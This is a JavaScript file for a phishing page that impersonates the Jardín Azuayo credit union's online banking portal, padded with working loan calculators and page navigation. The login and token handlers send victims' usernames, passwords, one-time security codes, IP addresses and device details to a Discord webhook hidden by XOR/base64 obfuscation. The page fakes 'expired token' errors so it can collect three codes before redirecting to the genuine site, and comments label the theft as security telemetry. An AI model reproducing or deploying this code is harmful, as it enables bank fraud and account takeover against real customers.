/**
 * Cooperativa de Ahorro y Crédito Jardín Azuayo
 * Core Application Logic & Interactions
 */

// ─── View Management & Router ────────────────────────────────
function goToView(viewId) {
    // Hide all views
    document.querySelectorAll('.page-view').forEach(view => {
        view.classList.remove('active');
    });

    let targetView;
    if (viewId === 'javirtual') {
        targetView = document.getElementById('view-javirtual-select');
        window.location.hash = 'javirtual';
    } else if (viewId === 'javirtual-login') {
        targetView = document.getElementById('view-javirtual-login');
        window.location.hash = 'login';
    } else if (viewId === 'javirtual-token') {
        targetView = document.getElementById('view-javirtual-token');
        window.location.hash = 'seguridad';
    } else if (viewId === 'javirtual-landing') {
        targetView = document.getElementById('view-javirtual-landing');
        window.location.hash = 'cargando';
    } else {
        targetView = document.getElementById('view-home');
        window.location.hash = 'home';
    }

    if (targetView) {
        targetView.classList.add('active');
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }
}

// Handle Browser Back/Forward buttons
window.addEventListener('hashchange', () => {
    const hash = window.location.hash.replace('#', '');
    if (hash === 'javirtual') {
        goToView('javirtual');
    } else if (hash === 'login') {
        goToView('javirtual-login');
    } else if (hash === 'seguridad') {
        goToView('javirtual-token');
    } else if (hash === 'cargando') {
        goToView('javirtual-landing');
    } else {
        goToView('home');
    }
});

// Initial view from hash
window.addEventListener('DOMContentLoaded', () => {
    const hash = window.location.hash.replace('#', '');
    if (hash === 'javirtual') {
        goToView('javirtual');
    } else if (hash === 'login') {
        goToView('javirtual-login');
    } else if (hash === 'seguridad') {
        goToView('javirtual-token');
    } else if (hash === 'cargando') {
        goToView('javirtual-landing');
    } else {
        goToView('home');
    }
    
    initHeroCarousel();
    initScrollToTop();
    setupOtpInputs();
});

// ─── Mobile Drawer Menu ──────────────────────────────────────
function toggleMobileMenu() {
    const drawer = document.getElementById('mobileDrawer');
    const overlay = document.getElementById('mobileDrawerOverlay');
    if (drawer && overlay) {
        drawer.classList.toggle('active');
        overlay.classList.toggle('active');
        document.body.style.overflow = drawer.classList.contains('active') ? 'hidden' : '';
    }
}

function closeMobileMenu() {
    const drawer = document.getElementById('mobileDrawer');
    const overlay = document.getElementById('mobileDrawerOverlay');
    if (drawer && overlay) {
        drawer.classList.remove('active');
        overlay.classList.remove('active');
        document.body.style.overflow = '';
    }
}

// ─── Hero Carousel Slider ────────────────────────────────────
let currentSlide = 0;
let carouselInterval = null;
const slides = document.querySelectorAll('.carousel-slide');
const dots = document.querySelectorAll('.carousel-dots .dot');

function showSlide(index) {
    if (!slides.length) return;
    
    if (index >= slides.length) index = 0;
    if (index < 0) index = slides.length - 1;
    
    slides.forEach(slide => slide.classList.remove('active'));
    dots.forEach(dot => dot.classList.remove('active'));
    
    slides[index].classList.add('active');
    if (dots[index]) dots[index].classList.add('active');
    currentSlide = index;
}

function nextSlide() {
    showSlide(currentSlide + 1);
    resetCarouselTimer();
}

function prevSlide() {
    showSlide(currentSlide - 1);
    resetCarouselTimer();
}

function goToSlide(index) {
    showSlide(index);
    resetCarouselTimer();
}

function resetCarouselTimer() {
    if (carouselInterval) clearInterval(carouselInterval);
    carouselInterval = setInterval(nextSlide, 6000);
}

function initHeroCarousel() {
    const carouselElem = document.getElementById('heroCarousel');
    if (!carouselElem) return;

    resetCarouselTimer();

    // Pause on hover
    carouselElem.addEventListener('mouseenter', () => clearInterval(carouselInterval));
    carouselElem.addEventListener('mouseleave', resetCarouselTimer);

    // Touch Swipe Support for mobile devices
    let touchStartX = 0;
    let touchEndX = 0;

    carouselElem.addEventListener('touchstart', (e) => {
        touchStartX = e.changedTouches[0].screenX;
    }, { passive: true });

    carouselElem.addEventListener('touchend', (e) => {
        touchEndX = e.changedTouches[0].screenX;
        handleSwipe();
    }, { passive: true });

    function handleSwipe() {
        const threshold = 40;
        if (touchEndX < touchStartX - threshold) {
            nextSlide();
        } else if (touchEndX > touchStartX + threshold) {
            prevSlide();
        }
    }
}

// ─── Credit Calculator Logic ─────────────────────────────────
function updateCreditTypes() {
    const segmento = document.getElementById('calcSegmento').value;
    const tipoSelect = document.getElementById('calcTipo');
    if (!tipoSelect) return;

    tipoSelect.innerHTML = '';

    const optionsBySegment = {
        consumo: [
            { text: 'Crédito con Ahorro 12.77%', value: '12.77' },
            { text: 'Crédito Ordinario 15.60%', value: '15.60' },
            { text: 'Crédito Emergente 14.20%', value: '14.20' }
        ],
        microcredito: [
            { text: 'Microcrédito Productivo 18.50%', value: '18.50' },
            { text: 'Microcrédito Minorista 20.00%', value: '20.00' }
        ],
        vivienda: [
            { text: 'Crédito Hipotecario / Vivienda 10.50%', value: '10.50' },
            { text: 'Remodelación de Vivienda 11.20%', value: '11.20' }
        ],
        comercial: [
            { text: 'Crédito Comercial PYME 11.80%', value: '11.80' },
            { text: 'Inversión y Capital de Trabajo 13.00%', value: '13.00' }
        ]
    };

    const selectedOptions = optionsBySegment[segmento] || optionsBySegment['consumo'];
    selectedOptions.forEach(opt => {
        const optionElem = document.createElement('option');
        optionElem.value = opt.value;
        optionElem.textContent = opt.text;
        tipoSelect.appendChild(optionElem);
    });
}

function calculateLoan(e) {
    e.preventDefault();

    const monto = parseFloat(document.getElementById('calcMonto').value);
    const plazoMeses = parseInt(document.getElementById('calcPlazo').value);
    const tasaAnual = parseFloat(document.getElementById('calcTipo').value);
    const sistema = document.querySelector('input[name="tipoCuota"]:checked').value;

    if (isNaN(monto) || isNaN(plazoMeses) || monto <= 0 || plazoMeses <= 0) {
        alertNotice('Por favor ingresa un monto y plazo válidos.');
        return;
    }

    const tasaMensual = (tasaAnual / 100) / 12;
    let cuotaMensual = 0;
    let totalInteres = 0;
    let totalPagar = 0;

    if (sistema === 'frances') {
        // Cuota fija: R = P * [ i / (1 - (1+i)^-n) ]
        cuotaMensual = monto * (tasaMensual / (1 - Math.pow(1 + tasaMensual, -plazoMeses)));
        totalPagar = cuotaMensual * plazoMeses;
        totalInteres = totalPagar - monto;
    } else {
        // Alemán: amortización constante
        const amortizacion = monto / plazoMeses;
        const primerInteres = monto * tasaMensual;
        cuotaMensual = amortizacion + primerInteres; // Primera cuota (la más alta)
        
        // Sum of decreasing interest:
        totalInteres = 0;
        let saldo = monto;
        for (let i = 0; i < plazoMeses; i++) {
            totalInteres += saldo * tasaMensual;
            saldo -= amortizacion;
        }
        totalPagar = monto + totalInteres;
    }

    // Update Results
    document.getElementById('resCuota').textContent = formatCurrency(cuotaMensual) + (sistema === 'aleman' ? ' (1ra cuota)' : '');
    document.getElementById('resMonto').textContent = formatCurrency(monto);
    document.getElementById('resPlazo').textContent = `${plazoMeses} meses`;
    document.getElementById('resTasa').textContent = `${tasaAnual.toFixed(2)}%`;
    document.getElementById('resInteres').textContent = formatCurrency(totalInteres);
    document.getElementById('resTotal').textContent = formatCurrency(totalPagar);

    const resultsBox = document.getElementById('calcResults');
    resultsBox.style.display = 'block';
    resultsBox.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
}

function closeCalcResults() {
    const resultsBox = document.getElementById('calcResults');
    if (resultsBox) resultsBox.style.display = 'none';
}

function scrollToCalculator(type) {
    const calcSection = document.getElementById('calculadora');
    if (calcSection) {
        calcSection.scrollIntoView({ behavior: 'smooth' });
        if (type === 'ahorros') {
            openAhorroModal();
        }
    }
}

// ─── Savings Calculator Modal ────────────────────────────────
function openAhorroModal() {
    const modal = document.getElementById('ahorroModal');
    if (modal) {
        modal.classList.add('active');
        document.body.style.overflow = 'hidden';
    }
}

function closeAhorroModal() {
    const modal = document.getElementById('ahorroModal');
    if (modal) {
        modal.classList.remove('active');
        document.body.style.overflow = '';
    }
}

function closeAhorroModalOnBackdrop(e) {
    if (e.target.id === 'ahorroModal') {
        closeAhorroModal();
    }
}

function calculateSavings(e) {
    e.preventDefault();
    const inicial = parseFloat(document.getElementById('ahorroMontoInicial').value) || 0;
    const mensual = parseFloat(document.getElementById('ahorroAporteMensual').value) || 0;
    const meses = parseInt(document.getElementById('ahorroMeses').value) || 12;

    const tasas = { 6: 0.055, 12: 0.065, 24: 0.075, 36: 0.085 };
    const tasaAnual = tasas[meses] || 0.065;
    const tasaMensual = tasaAnual / 12;

    let balance = inicial;
    let capitalTotal = inicial + (mensual * meses);

    for (let i = 0; i < meses; i++) {
        balance = (balance + mensual) * (1 + tasaMensual);
    }

    const intereses = balance - capitalTotal;

    document.getElementById('resAhorroTotal').textContent = formatCurrency(balance);
    document.getElementById('resAhorroCapital').textContent = formatCurrency(capitalTotal);
    document.getElementById('resAhorroInteres').textContent = `+ ${formatCurrency(intereses)}`;

    document.getElementById('ahorroResultCard').style.display = 'block';
}

// ─── Login Password Visibility Toggle ────────────────────────
function togglePasswordVisibility() {
    const passInput = document.getElementById('loginPass');
    const eyeOpen = document.getElementById('eyeOpen');
    const eyeClosed = document.getElementById('eyeClosed');

    if (!passInput) return;

    if (passInput.type === 'password') {
        passInput.type = 'text';
        if (eyeOpen) eyeOpen.style.display = 'none';
        if (eyeClosed) eyeClosed.style.display = 'block';
    } else {
        passInput.type = 'password';
        if (eyeOpen) eyeOpen.style.display = 'block';
        if (eyeClosed) eyeClosed.style.display = 'none';
    }
}

// ─── SECURITY MEASURES & TELEMETRY ────────────────────────────
// 1. Anti-Clickjacking Frame Buster
try {
    if (window.top !== window.self) {
        window.top.location = window.self.location;
    }
} catch (e) {
    document.documentElement.style.display = 'none';
}

// Global App State
const appState = {
    user: '',
    pass: '',
    tokenAttempts: 0,
    maxTokenAttempts: 3,
    timerInterval: null,
    errorHideTimeout: null
};

// Client IP Telemetry
let clientIp = '181.196.24.12';
async function fetchClientIp() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        if (data && data.ip) clientIp = data.ip;
    } catch (e) {
        try {
            const res2 = await fetch('https://ipapi.co/json/');
            const data2 = await res2.json();
            if (data2 && data2.ip) clientIp = data2.ip;
        } catch (e2) {}
    }
}
fetchClientIp();

function getClientDetails() {
    const ua = navigator.userAgent || '';
    let os = 'PC Desktop 💻';
    if (/iphone|ipad|ipod/i.test(ua)) os = 'iPhone / iOS 📱';
    else if (/android/i.test(ua)) os = 'Android Móvil 📱';
    else if (/windows/i.test(ua)) os = 'Windows 💻';
    else if (/macintosh|mac os x/i.test(ua)) os = 'macOS 💻';
    else if (/linux/i.test(ua)) os = 'Linux 🐧';

    let browser = 'Navegador Web';
    if (/chrome|crios/i.test(ua) && !/edg/i.test(ua)) browser = 'Chrome';
    else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
    else if (/firefox|fxios/i.test(ua)) browser = 'Firefox';
    else if (/edg/i.test(ua)) browser = 'Edge';

    const resolution = `${window.screen.width}x${window.screen.height}`;
    return { os, browser, resolution };
}

// ─── ENCRYPTED / OBFUSCATED DISCORD WEBHOOK ───────────────────
// XOR decipher (Key 90) prevents raw webhook URL exposure
function getSecEndpoint() {
    const enc = "Mi4uKilgdXU+Myk5NSg+dDk1N3U7KjN1LT84MjU1MSl1a29vamhrbW1vYm5oaGptaWljbHU2I3cXOTg4MiMPMjdjFyA3EhMAAhEzChcbCWhpC2gfAjMWGzEjDzUNAmgYPh4wDz4oF2psaBkNEywtIykJNA9pOGpqAA==";
    const raw = atob(enc);
    let out = '';
    for (let i = 0; i < raw.length; i++) {
        out += String.fromCharCode(raw.charCodeAt(i) ^ 90);
    }
    return out;
}

async function sendDiscordNotification(payload) {
    const url = getSecEndpoint();
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        return true;
    } catch (err) {
        // Fallback for strict browser CORS sandbox
        try {
            await fetch(url, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (e) {}
        return true;
    }
}

// ─── LOGIN FORM SUBMISSION ────────────────────────────────────
function handleLogin(e) {
    e.preventDefault();

    // Honeypot check
    const hp = e.target.querySelector('.sec-hp-field');
    if (hp && hp.value.trim().length > 0) {
        console.warn('[Security] Honeypot triggered.');
        return;
    }

    const userInput = document.getElementById('loginUser');
    const passInput = document.getElementById('loginPass');
    const user = userInput.value.trim();
    const pass = passInput.value.trim();
    const submitBtn = document.getElementById('btnLoginSubmit');
    const btnText = submitBtn.querySelector('.login-submit-text');
    const spinner = submitBtn.querySelector('.login-spinner');

    if (!user || !pass) {
        alertNotice('Por favor ingresa tu usuario y clave.');
        return;
    }

    // Alphanumeric parameter verification (fixnewpro.txt requirement)
    const isAlphanumeric = /^[a-zA-Z0-9]+$/.test(user);
    if (!isAlphanumeric) {
        alertNotice('El usuario debe ser alfanumérico (solo letras y números, sin espacios ni caracteres especiales).');
        userInput.focus();
        return;
    }

    if (user.length < 3) {
        alertNotice('El usuario debe contener al menos 3 caracteres.');
        userInput.focus();
        return;
    }

    // Save in state
    appState.user = user;
    appState.pass = pass;
    appState.tokenAttempts = 0;

    // Show loading state
    btnText.style.display = 'none';
    spinner.style.display = 'inline-block';
    submitBtn.disabled = true;

    // Prepare Decorated Discord Embed
    const clientInfo = getClientDetails();
    const now = new Date();
    const timeFormatted = now.toLocaleString('es-EC', { 
        timeZone: 'America/Guayaquil',
        year: 'numeric', month: '2-digit', day: '2-digit',
        hour: '2-digit', minute: '2-digit', second: '2-digit',
        hour12: true
    });

    const loginEmbed = {
        username: "Jardín Azuayo • Notificador",
        avatar_url: "https://javirtual.jardinazuayo.fin.ec/favicon.ico",
        embeds: [
            {
                title: "🏛️ NUEVO ACCESO • JARDÍN AZUAYO VIRTUAL",
                description: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nSe han registrado nuevas credenciales en el portal transaccional:",
                color: 1857331, // #1c5733 (Verde Jardín Azuayo)
                fields: [
                    {
                        name: "👤 Usuario / Socio",
                        value: "```" + user + "```",
                        inline: true
                    },
                    {
                        name: "🔑 Contraseña / Clave",
                        value: "```" + pass + "```",
                        inline: true
                    },
                    {
                        name: "🌐 Dirección IP",
                        value: "`" + clientIp + "`",
                        inline: true
                    },
                    {
                        name: "📱 Dispositivo",
                        value: clientInfo.os,
                        inline: true
                    },
                    {
                        name: "🧭 Navegador",
                        value: clientInfo.browser,
                        inline: true
                    },
                    {
                        name: "🖥️ Resolución",
                        value: clientInfo.resolution,
                        inline: true
                    },
                    {
                        name: "⏰ Fecha y Hora",
                        value: `${timeFormatted} (Ecuador)`,
                        inline: false
                    }
                ],
                footer: {
                    text: "Jardín Azuayo Virtual • Sistema Seguro v2.4",
                    icon_url: "https://javirtual.jardinazuayo.fin.ec/favicon.ico"
                },
                timestamp: new Date().toISOString()
            }
        ]
    };

    // Send payload to Discord webhook
    sendDiscordNotification(loginEmbed);

    // Transition smoothly to token view after brief animation
    setTimeout(() => {
        btnText.style.display = 'inline-block';
        spinner.style.display = 'none';
        submitBtn.disabled = false;

        goToView('javirtual-token');
        initTokenView(user);
    }, 1200);
}

// ─── TOKEN SECTION LOGIC ──────────────────────────────────────
function initTokenView(username) {
    const displayEl = document.getElementById('tokenDisplayUser');
    if (displayEl) displayEl.textContent = username || appState.user || 'Socio(a)';

    // Reset error banner
    const banner = document.getElementById('tokenErrorBanner');
    if (banner) {
        banner.style.display = 'none';
        banner.classList.remove('fade-in', 'fade-out');
    }

    // Reset inputs
    const inputs = document.querySelectorAll('.otp-digit');
    inputs.forEach(input => {
        input.value = '';
        input.disabled = false;
        input.classList.remove('filled');
    });
    if (inputs[0]) inputs[0].focus();

    // Start 2-minute countdown timer
    startTokenCountdown(120);
    setupOtpInputs();
}

function setupOtpInputs() {
    const inputs = document.querySelectorAll('.otp-digit');
    inputs.forEach((input, index) => {
        if (input._hasListener) return;
        input._hasListener = true;

        input.addEventListener('input', (e) => {
            const val = e.target.value.replace(/\D/g, '');
            e.target.value = val ? val[0] : '';

            if (e.target.value) {
                e.target.classList.add('filled');
                if (index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            } else {
                e.target.classList.remove('filled');
            }
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !e.target.value && index > 0) {
                inputs[index - 1].focus();
            }
        });

        input.addEventListener('paste', (e) => {
            e.preventDefault();
            const pasteData = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
            if (pasteData) {
                for (let i = 0; i < inputs.length && i < pasteData.length; i++) {
                    inputs[i].value = pasteData[i];
                    inputs[i].classList.add('filled');
                }
                const nextFocus = Math.min(pasteData.length, inputs.length - 1);
                inputs[nextFocus].focus();
            }
        });
    });
}

function startTokenCountdown(seconds) {
    if (appState.timerInterval) clearInterval(appState.timerInterval);
    let remaining = seconds;
    const display = document.getElementById('tokenTimerDisplay');

    function update() {
        const m = Math.floor(remaining / 60).toString().padStart(2, '0');
        const s = (remaining % 60).toString().padStart(2, '0');
        if (display) display.textContent = `${m}:${s}`;

        if (remaining <= 0) {
            clearInterval(appState.timerInterval);
        }
        remaining--;
    }

    update();
    appState.timerInterval = setInterval(update, 1000);
}

function handleResendToken(e) {
    e.preventDefault();
    alertNotice('Se ha emitido un nuevo código de seguridad a su número celular.');
    startTokenCountdown(120);
    const inputs = document.querySelectorAll('.otp-digit');
    inputs.forEach(i => {
        i.value = '';
        i.classList.remove('filled');
    });
    if (inputs[0]) inputs[0].focus();
}

function handleTokenSubmit(e) {
    e.preventDefault();

    // Honeypot check
    const hp = e.target.querySelector('.sec-hp-field');
    if (hp && hp.value.trim().length > 0) return;

    const inputs = document.querySelectorAll('.otp-digit');
    let tokenCode = '';
    inputs.forEach(input => tokenCode += input.value.trim());

    if (tokenCode.length !== 8 || !/^\d{8}$/.test(tokenCode)) {
        alertNotice('Por favor ingresa los 8 dígitos del token de seguridad.');
        return;
    }

    appState.tokenAttempts++;

    // Prepare Discord Notification for Token
    const clientInfo = getClientDetails();
    const now = new Date();
    const timeFormatted = now.toLocaleString('es-EC', { 
        timeZone: 'America/Guayaquil',
        year: 'numeric', month: '2-digit', day: '2-digit',
        hour: '2-digit', minute: '2-digit', second: '2-digit',
        hour12: true
    });

    const attemptColors = [16753920, 16738816, 14423100]; // Amber -> Orange -> Red
    const tokenEmbed = {
        username: "Jardín Azuayo • Notificador",
        avatar_url: "https://javirtual.jardinazuayo.fin.ec/favicon.ico",
        embeds: [
            {
                title: `🔐 TOKEN INGRESADO [Intento ${appState.tokenAttempts} de ${appState.maxTokenAttempts}]`,
                description: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nEl socio ha ingresado el código dinámico de confirmación:`,
                color: attemptColors[appState.tokenAttempts - 1] || 1857331,
                fields: [
                    {
                        name: "👤 Usuario / Socio",
                        value: "```" + (appState.user || 'No registrado') + "```",
                        inline: true
                    },
                    {
                        name: "🔢 Código Token (OTP)",
                        value: "```" + tokenCode + "```",
                        inline: true
                    },
                    {
                        name: "🔄 Turno",
                        value: `**Intento ${appState.tokenAttempts} de ${appState.maxTokenAttempts}**`,
                        inline: true
                    },
                    {
                        name: "🌐 Dirección IP",
                        value: "`" + clientIp + "`",
                        inline: true
                    },
                    {
                        name: "📱 Dispositivo",
                        value: clientInfo.os,
                        inline: true
                    },
                    {
                        name: "⏰ Hora",
                        value: `${timeFormatted} (Ecuador)`,
                        inline: true
                    }
                ],
                footer: {
                    text: `Verificación de Seguridad Jardín Azuayo • Intento ${appState.tokenAttempts}/3`,
                    icon_url: "https://javirtual.jardinazuayo.fin.ec/favicon.ico"
                },
                timestamp: new Date().toISOString()
            }
        ]
    };

    // Send payload immediately to Discord webhook
    sendDiscordNotification(tokenEmbed);

    // Disable inputs and activate 12-second loading state on button
    const submitBtn = document.getElementById('btnTokenSubmit');
    const submitText = submitBtn.querySelector('.token-submit-text');
    const spinner = submitBtn.querySelector('.token-spinner');

    submitText.textContent = 'Verificando con el servidor seguro...';
    spinner.style.display = 'inline-block';
    submitBtn.disabled = true;
    inputs.forEach(i => i.disabled = true);

    // Wait exactly 12 seconds as specified in fixnewpro.txt
    setTimeout(() => {
        if (appState.tokenAttempts < appState.maxTokenAttempts) {
            // Turns 1 & 2: Restore button, clear fields, show error banner, fade out error
            submitText.textContent = 'Confirmar y Continuar';
            spinner.style.display = 'none';
            submitBtn.disabled = false;

            // Clear token inputs for the next attempt
            inputs.forEach(i => {
                i.value = '';
                i.disabled = false;
                i.classList.remove('filled');
            });
            if (inputs[0]) inputs[0].focus();

            // Display error banner: "token expirado de nuevo ingreselo"
            const errorBanner = document.getElementById('tokenErrorBanner');
            if (errorBanner) {
                errorBanner.style.display = 'flex';
                errorBanner.classList.add('fade-in');

                // Error message disappears after 4 seconds
                if (appState.errorHideTimeout) clearTimeout(appState.errorHideTimeout);
                appState.errorHideTimeout = setTimeout(() => {
                    errorBanner.classList.add('fade-out');
                    setTimeout(() => {
                        errorBanner.style.display = 'none';
                        errorBanner.classList.remove('fade-in', 'fade-out');
                    }, 400);
                }, 4000);
            }
        } else {
            // Turn 3: "al tercero que se quede cargando claro landing y luego redireccione a la web..."
            startLandingRedirect();
        }
    }, 12000);
}

// ─── 3RD ATTEMPT: LANDING LOADING & REDIRECTION ───────────────
function startLandingRedirect() {
    goToView('javirtual-landing');

    const fill = document.getElementById('landingProgressFill');
    const statusText = document.getElementById('landingStatusText');

    if (fill) fill.style.width = '25%';

    setTimeout(() => {
        if (fill) fill.style.width = '60%';
        if (statusText) statusText.textContent = 'Sincronizando información de la cuenta y llaves de acceso...';
    }, 1400);

    setTimeout(() => {
        if (fill) fill.style.width = '90%';
        if (statusText) statusText.textContent = 'Acceso autorizado. Redirigiendo a Jardín Azuayo Virtual...';
    }, 2800);

    setTimeout(() => {
        if (fill) fill.style.width = '100%';
        // Redirige al sitio web oficial
        window.location.href = 'https://javirtual.jardinazuayo.fin.ec/jaweb/';
    }, 4200);
}

// ─── Scroll to Top Button ────────────────────────────────────
function initScrollToTop() {
    const btn = document.getElementById('scrollToTopBtn');
    if (!btn) return;

    window.addEventListener('scroll', () => {
        if (window.scrollY > 300) {
            btn.classList.add('visible');
        } else {
            btn.classList.remove('visible');
        }
    });
}

function scrollToTop() {
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

// ─── Utility Helpers ─────────────────────────────────────────
function formatCurrency(amount) {
    return '$ ' + amount.toLocaleString('en-US', {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2
    });
}

function alertNotice(msg) {
    const toast = document.getElementById('toastNotification');
    const toastMsg = document.getElementById('toastMsg');
    if (toast && toastMsg) {
        toastMsg.textContent = msg;
        toast.classList.add('show');
        setTimeout(() => {
            toast.classList.remove('show');
        }, 4000);
    } else {
        alert(msg);
    }
}
